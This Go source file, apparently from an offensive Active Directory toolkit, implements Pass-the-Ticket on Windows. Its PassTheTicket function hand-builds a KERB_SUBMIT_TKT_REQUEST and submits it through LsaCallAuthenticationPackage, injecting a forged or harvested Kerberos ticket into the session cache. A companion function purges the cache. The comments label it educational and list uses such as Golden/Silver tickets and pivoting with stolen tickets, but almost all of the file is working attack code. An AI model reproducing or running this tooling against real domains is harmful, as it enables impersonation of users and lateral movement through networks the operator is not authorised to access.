//go:build windows
// +build windows

package windows

import (
	"fmt"
	"unsafe"

	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Pass-the-Ticket (PTT)
//
// PTT injects a Kerberos ticket into the current session's ticket cache.
// After injection, Windows will use this ticket for authentication.
//
// Use cases:
//   - Use a Golden/Silver ticket we forged
//   - Use a ticket extracted from another machine
//   - Pivot with a harvested ticket
//
// How it works:
// 1. Parse the .kirbi to get the ticket
// 2. Build KERB_SUBMIT_TKT_REQUEST message
// 3. Call LsaCallAuthenticationPackage
// 4. Windows caches the ticket
//
// Note: PT can only inject into your own session unless elevated.

// KERB_PROTOCOL_MESSAGE_TYPE constants
const (
	KerbDebugRequestMessage                 = 0
	KerbQueryTicketCacheMessage             = 1
	KerbChangeMachinePasswordMessage        = 2
	KerbVerifyPacMessage                    = 3
	KerbRetrieveTicketMessage               = 4
	KerbUpdateAddressesMessage              = 5
	KerbPurgeTicketCacheMessage             = 6
	KerbChangePasswordMessage               = 7
	KerbRetrieveEncodedTicketMessage        = 8
	KerbDecryptDataMessage                  = 9
	KerbAddBindingCacheEntryMessage         = 10
	KerbSetPasswordMessage                  = 11
	KerbSetPasswordExMessage                = 12
	KerbVerifyCredentialsMessage            = 13
	KerbQueryTicketCacheExMessage           = 14
	KerbPurgeTicketCacheExMessage           = 15
	KerbRefreshSmartcardCredentialsMessage  = 16
	KerbAddExtraCredentialsMessage          = 17
	KerbQuerySupplementalCredentialsMessage = 18
	KerbTransferCredentialsMessage          = 19
	KerbQueryTicketCacheEx2Message          = 20
	KerbSubmitTicketMessage                 = 21
	KerbAddExtraCredentialsExMessage        = 22
	KerbQueryKdcProxyCacheMessage           = 23
	KerbPurgeKdcProxyCacheMessage           = 24
	KerbQueryTicketCacheEx3Message          = 25
	KerbCleanupMachinePkinitCredsMessage    = 26
	KerbAddBindingCacheEntryExMessage       = 27
	KerbQueryBindingCacheMessage            = 28
	KerbPurgeBindingCacheMessage            = 29
	KerbPinKdcMessage                       = 30
	KerbUnpinAllKdcsMessage                 = 31
	KerbQueryDomainExtendedPoliciesMessage  = 32
	KerbQueryS4U2ProxyCacheMessage          = 33
)

// PassTheTicket injects a ticket into the current session.
//
// EDUCATIONAL: PTT Injection
//
// This is how we use forged or harvested tickets:
// 1. Load the .kirbi
// 2. Call this function
// 3. Windows now has the ticket cached
// 4. Any auth to the ticket's service uses it!
func PassTheTicket(kirbi *ticket.Kirbi) error {
	if kirbi == nil || kirbi.Cred == nil {
		return fmt.Errorf("invalid ticket")
	}

	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return fmt.Errorf("failed to connect to LSA: %w", err)
	}
	defer lsaDisconnect(handle)

	// Get Kerberos package
	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return fmt.Errorf("failed to lookup Kerberos package: %w", err)
	}

	// Marshal the ticket to bytes
	ticketBytes, err := kirbi.ToBytes()
	if err != nil {
		return fmt.Errorf("failed to marshal ticket: %w", err)
	}

	// Build submit request
	// KERB_SUBMIT_TKT_REQUEST structure:
	//   MessageType: KERB_SUBMIT_TKT_REQUEST (21)
	//   LogonId: LUID (8 bytes, 0 = current)
	//   Flags: 0
	//   Key: KERB_CRYPTO_KEY (optional, for KrbCred)
	//     - KeyType: int32
	//     - Length: int32
	//     - Value: ptr
	//   KerbCredSize: int32
	//   KerbCredOffset: int32

	requestSize := 4 + 8 + 4 + 12 + 4 + 4 + len(ticketBytes)
	request := make([]byte, requestSize)

	// MessageType
	request[0] = byte(KerbSubmitTicketMessage)
	// LogonId = 0 (current session) - bytes 4-11
	// Flags = 0 - bytes 12-15
	// Key = empty (KeyType=0, Length=0) - bytes 16-27
	// KerbCredSize
	*(*int32)(unsafe.Pointer(&request[28])) = int32(len(ticketBytes))
	// KerbCredOffset - right after the header
	*(*int32)(unsafe.Pointer(&request[32])) = 36
	// Copy ticket data
	copy(request[36:], ticketBytes)

	// Call LSA
	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(len(request)),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if response != nil {
		procLsaFreeReturnBuffer.Call(uintptr(response))
	}

	if ret != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
	}
	if protocolStatus != 0 {
		return fmt.Errorf("Kerberos returned error: 0x%x", protocolStatus)
	}

	return nil
}

// PurgeTickets purges all tickets from the current session.
func PurgeTickets() error {
	handle, err := lsaConnect()
	if err != nil {
		return err
	}
	defer lsaDisconnect(handle)

	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return err
	}

	// KERB_PURGE_TKT_CACHE_REQUEST
	request := make([]byte, 24)
	request[0] = byte(KerbPurgeTicketCacheMessage)
	// LogonId = 0, ServerName = empty, RealmName = empty

	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(len(request)),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if response != nil {
		procLsaFreeReturnBuffer.Call(uintptr(response))
	}

	if ret != 0 || protocolStatus != 0 {
		return fmt.Errorf("purge failed: LSA=0x%x, Protocol=0x%x", ret, protocolStatus)
	}

	return nil
}
